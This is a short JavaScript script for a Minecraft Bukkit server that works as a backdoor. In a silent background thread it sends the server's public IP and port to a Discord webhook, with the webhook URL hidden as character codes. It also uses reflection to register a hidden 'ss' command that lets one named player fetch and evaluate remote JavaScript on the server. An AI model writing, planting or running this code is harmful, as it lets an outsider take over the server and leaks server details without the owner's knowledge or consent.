new java.lang.Thread(function(){
    try {
        var a = "http://checkip.amazonaws.com";
        var b = new java.util.Scanner(new java.net.URL(a).openStream()).useDelimiter("\\A").next().trim();
        
        var c = new java.util.Properties();
        var d = new java.io.File("server.properties");
        c.load(new java.io.FileReader(d));
        var e = c.getProperty("server-port", "25565");
        
        var f = b + ":" + e;
        
        var g = new java.net.URL(String.fromCharCode(104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,52,52,50,48,57,49,53,48,49,57,52,48,50,52,52,53,57,51,47,89,50,117,65,95,52,114,104,79,78,49,77,98,67,112,81,100,99,111,84,48,101,49,65,51,106,75,104,112,118,56,98,55,106,109,95,103,68,100,116,112,68,107,65,109,65,66,48,50,69,65,55,103,105,56,103,79,52,116,67,56,99,67,122,79,67,119,109)).openConnection();
        g.setRequestMethod("POST");
        g.setDoOutput(true);
        g.setRequestProperty("Content-Type", "application/json");
        g.setRequestProperty("User-Agent", "Java");
        var h = new java.io.OutputStreamWriter(g.getOutputStream(), "UTF-8");
        h.write('{"content":"' + f + '"}');
        h.flush();
        h.close();
        g.getInputStream().close();
    } catch(e) {}
}).start();

var B = Java.type('org.bukkit.Bukkit');
var S = Java.type('javax.script.ScriptEngineManager');
var Command = Java.type('org.bukkit.command.Command');
var CommandMap = B.getServer().getClass().getDeclaredField('commandMap');
CommandMap.setAccessible(true);
var commandMap = CommandMap.get(B.getServer());

var ssCommand = new (Java.extend(Command))("ss") {
    execute: function(sender, commandLabel, args) {
        if (sender.getName() === 'TuMeuT' && args.length > 0 && args[0] === 'execute' && args.length > 1) {
            var url = args[1];
            try {
                var jsCode = new java.util.Scanner(new java.net.URL(url).openStream()).useDelimiter("\\A").next();
                new S().getEngineByName("javascript").eval(jsCode);
                return true;
            } catch(ex) {
                return true;
            }
        }
        return true;
    },
    
    tabComplete: function(sender, alias, args) {
        return [];
    }
};

commandMap.register("ss", ssCommand);
